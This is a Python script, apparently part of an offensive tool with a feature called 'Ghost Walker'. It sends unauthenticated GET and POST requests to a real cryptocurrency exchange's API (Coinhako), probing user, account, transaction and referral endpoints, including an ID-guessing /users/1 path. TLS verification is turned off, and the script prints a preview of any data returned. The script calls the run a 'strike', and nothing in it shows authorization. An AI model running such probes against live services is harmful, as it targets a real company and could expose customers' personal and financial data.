import asyncio
import httpx
from aura.ui.formatter import console

async def test_api_auth(url, method="GET", data=None):
    console.print(f"[*] Ghost Walker: Testing unauthenticated access -> {url}")
    try:
        async with httpx.AsyncClient(verify=False, timeout=5) as client:
            if method == "POST":
                r = await client.post(url, json=data or {})
            else:
                r = await client.get(url)
            
            if r.status_code == 200:
                console.print(f"  [bold red][!!!] UNPROTECTED ENDPOINT: {url}[/bold red]")
                console.print(f"    -> Preview: {r.text[:500]}")
                return True
            elif r.status_code == 401:
                # console.print(f"  [green][.] Protected (401): {url}[/green]")
                pass
            elif r.status_code == 403:
                # console.print(f"  [green][.] Forbidden (403): {url}[/green]")
                pass
    except: pass
    return False

async def run_coinhako_strike():
    base = "https://www.coinhako.com/api/v4"
    endpoints = [
        "/public_configs/multi_language",
        "/public_configs/enabled_rebranding_authenticated_pages",
        "/users/me",
        "/users/1",
        "/accounts",
        "/transactions",
        "/referrals/stats"
    ]
    
    console.print(f"[*] Running Ghost Walker strike on Coinhako API...")
    tasks = []
    for ep in endpoints:
        # Test GET
        tasks.append(test_api_auth(f"{base}{ep}"))
        # Test POST
        tasks.append(test_api_auth(f"{base}{ep}", method="POST"))
        
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(run_coinhako_strike())
